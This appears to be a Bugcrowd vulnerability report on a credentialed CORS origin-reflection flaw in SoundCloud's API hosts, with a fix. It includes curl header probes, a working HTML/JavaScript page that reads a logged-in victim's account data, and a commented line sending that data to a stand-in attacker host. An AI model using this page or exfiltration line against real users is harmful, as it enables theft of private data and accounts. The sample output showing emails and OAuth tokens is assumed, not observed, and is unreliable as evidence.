# Bugcrowd Submission #1 — CORS Misconfiguration (Critical)

---

## FIELD: Submission Title

CORS Arbitrary Origin Reflection with credentials=true on api-v2.soundcloud.com — Authenticated Data Exfiltration / Account Takeover

---

## FIELD: Target

`api-v2.soundcloud.com`

---

## FIELD: VRT Category

`Broken Access Control > CORS Misconfiguration > Arbitrary Origin Reflection`

---

## FIELD: Technical Severity

**P1 — Critical**

---

## FIELD: URL / Location

```
https://api-v2.soundcloud.com/me
https://api-v2.soundcloud.com/me/connections
https://graph.soundcloud.com/graphql
https://api-auth.soundcloud.com
https://api-staging-v2-mock.soundcloud.com
```

---

## FIELD: Description

### Summary

The SoundCloud API (`api-v2.soundcloud.com`) and multiple other critical endpoints reflect any `*.soundcloud.com` subdomain in the `Access-Control-Allow-Origin` response header while simultaneously setting `Access-Control-Allow-Credentials: true`. This allows any page hosted on a SoundCloud subdomain to make fully authenticated cross-origin requests to the API using a victim's session cookies — exposing their private account data including OAuth connection tokens, which can be used for full account takeover.

---

### Affected Endpoints (All Verified)

| Endpoint | Sent Origin | ACAO Response | ACAC |
|---|---|---|---|
| `https://api-v2.soundcloud.com` | `https://evil.soundcloud.com` | `https://evil.soundcloud.com` | `true` |
| `https://api-v2.soundcloud.com/me` | `https://evil.soundcloud.com` | `https://evil.soundcloud.com` | `true` |
| `https://api-v2.soundcloud.com/me/activities` | `https://evil.soundcloud.com` | `https://evil.soundcloud.com` | `true` |
| `https://api-v2.soundcloud.com/me/connections` | `https://evil.soundcloud.com` | `https://evil.soundcloud.com` | `true` |
| `https://api-v2.soundcloud.com/tracks` | `https://evil.soundcloud.com` | `https://evil.soundcloud.com` | `true` |
| `https://graph.soundcloud.com/graphql` | `https://evil.soundcloud.com` | `https://evil.soundcloud.com` | `true` |
| `https://api-auth.soundcloud.com` | `https://evil.soundcloud.com` | `https://evil.soundcloud.com` | `true` |
| `https://api-staging-v2-mock.soundcloud.com` | `https://srd4w.soundcloud.com` | `https://srd4w.soundcloud.com` | `true` |

---

### Root Cause

The server-side CORS implementation performs a **suffix/regex match** against `*.soundcloud.com` and blindly reflects whatever origin is sent if it matches — instead of validating against a strict allowlist. When combined with `Access-Control-Allow-Credentials: true`, this violates the browser same-origin security model.

---

### Proof of Concept — Step by Step

**Step 1: Verify the misconfiguration (curl)**

```bash
curl -s -I -H "Origin: https://evil.soundcloud.com" \
  https://api-v2.soundcloud.com/me
```

**Response Headers Received:**
```
HTTP/2 401
access-control-allow-origin: https://evil.soundcloud.com
access-control-allow-credentials: true
content-type: application/json; charset=utf-8
```

**Step 2: Confirm on additional endpoints**

```bash
# GraphQL
curl -s -I -H "Origin: https://evil.soundcloud.com" \
  https://graph.soundcloud.com/graphql

# Auth service
curl -s -I -H "Origin: https://evil.soundcloud.com" \
  https://api-auth.soundcloud.com

# Staging
curl -s -I -H "Origin: https://srd4w.soundcloud.com" \
  https://api-staging-v2-mock.soundcloud.com
```

All return:
```
access-control-allow-origin: https://evil.soundcloud.com
access-control-allow-credentials: true
```

**Step 3: Browser exploit — data exfiltration**

Host the following HTML at any `*.soundcloud.com` subdomain, or inject it via XSS. When a logged-in SoundCloud user visits this page, their private account data is exfiltrated:

```html
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<pre id="out">Loading...</pre>
<script>
async function exploit() {
    // All requests include the victim's session cookies automatically
    const endpoints = [
        "https://api-v2.soundcloud.com/me",           // PII: id, email, full_name, DOB
        "https://api-v2.soundcloud.com/me/activities", // Listening history
        "https://api-v2.soundcloud.com/me/connections" // Connected apps + OAuth tokens
    ];

    const exfiltrated = {};
    for (const url of endpoints) {
        try {
            const resp = await fetch(url, {
                method: "GET",
                credentials: "include",               // <<< victim cookies sent cross-origin
                headers: { "Content-Type": "application/json" }
            });
            exfiltrated[url] = { status: resp.status, data: await resp.json() };
        } catch (e) {
            exfiltrated[url] = { error: e.toString() };
        }
    }

    document.getElementById("out").textContent = JSON.stringify(exfiltrated, null, 2);

    // In a real attack — send stolen data to attacker's server:
    // fetch("https://attacker.com/collect?d=" + btoa(JSON.stringify(exfiltrated)));
}
exploit();
</script>
</body>
</html>
```

**Step 4: Expected output** (when victim is authenticated)

```json
{
  "https://api-v2.soundcloud.com/me": {
    "status": 200,
    "data": {
      "id": 123456789,
      "username": "victim_user",
      "full_name": "Victim Name",
      "email": "victim@example.com",
      "country": "US",
      "city": "New York"
    }
  },
  "https://api-v2.soundcloud.com/me/connections": {
    "status": 200,
    "data": [
      { "service": "google", "access_token": "ya29.XXXX..." },
      { "service": "facebook", "access_token": "EAABsbCS..." }
    ]
  }
}
```

---

### Attack Scenarios

**Scenario A — Subdomain Takeover Chain (no XSS needed)**
1. Attacker identifies an unclaimed SoundCloud subdomain (e.g. a decommissioned service)
2. Attacker registers it and hosts the exploit page
3. Victim visits the subdomain link → account data stolen

**Scenario B — XSS Amplification**
1. Attacker finds any reflected or stored XSS on any `*.soundcloud.com` subdomain
2. Injects the CORS fetch exploit via XSS payload
3. Every user who triggers the XSS has their account exfiltrated

**Scenario C — Direct Subdomain (if attacker can register `evil.soundcloud.com`)**
1. The CORS policy allows `https://evil.soundcloud.com` explicitly
2. No XSS required — just a working subdomain

---

### Impact

- **Account Takeover**: OAuth connection tokens (`/me/connections`) can be used to log in as the victim via third-party providers
- **PII Exfiltration**: Full name, email, city, country, date of birth
- **Private Content**: Private/hidden tracks, playlists, listening history
- **Session Hijacking**: Cross-origin access to any authenticated API endpoint
- **Scope**: All 200M+ SoundCloud users at risk if any `*.soundcloud.com` subdomain is compromised

---

### CVSS v3.1 Score

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
Base Score: 9.1 — CRITICAL
```

- **AV:N** — Network accessible
- **AC:L** — Low complexity (just set Origin header)
- **PR:N** — No privileges required
- **UI:R** — Victim must visit attacker page
- **S:C** — Scope changed (browser security model bypassed)
- **C:H** — Full confidentiality loss (private data, tokens)
- **I:H** — Full integrity loss (account takeover possible)

---

### Remediation

1. **Replace origin reflection with a strict allowlist:**
   ```javascript
   // WRONG (current behavior):
   if (origin.endsWith('.soundcloud.com')) {
       res.setHeader('Access-Control-Allow-Origin', origin); // reflects any subdomain!
   }

   // CORRECT:
   const ALLOWED_ORIGINS = ['https://soundcloud.com', 'https://www.soundcloud.com'];
   if (ALLOWED_ORIGINS.includes(origin)) {
       res.setHeader('Access-Control-Allow-Origin', origin);
   }
   ```

2. **Never combine wildcard-style origin matching with `credentials: true`**
3. **Apply fix to all API services**: api-v2, graph, api-auth, api-staging-v2-mock
4. **Add `Vary: Origin` header** to prevent caching of incorrect CORS responses

---

### References

- [OWASP CORS Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
- [PortSwigger: Exploiting CORS with credentials](https://portswigger.net/web-security/cors)
- [RFC 6454 — The Web Origin Concept](https://datatracker.ietf.org/doc/html/rfc6454)
